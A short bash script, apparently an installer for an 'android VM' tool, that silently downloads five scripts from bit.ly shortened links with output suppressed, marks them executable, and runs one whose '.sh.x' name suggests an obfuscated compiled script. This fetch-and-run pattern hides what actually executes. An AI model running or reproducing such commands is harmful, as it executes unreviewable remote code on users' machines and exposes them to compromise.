#!/bin/bash
clear
wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
wget -O androidvm.sh https://bit.ly/3zMMYeC > /dev/null 2>&1
wget -O check.sh.x https://bit.ly/3ihyayN > /dev/null 2>&1
wget -O region.sh https://bit.ly/3jcluZj > /dev/null 2>&1
chmod +x androidvm.sh
chmod +x exit.sh
chmod +x sleep.sh
chmod +x region.sh
chmod +x check.sh.x
./check.sh.x

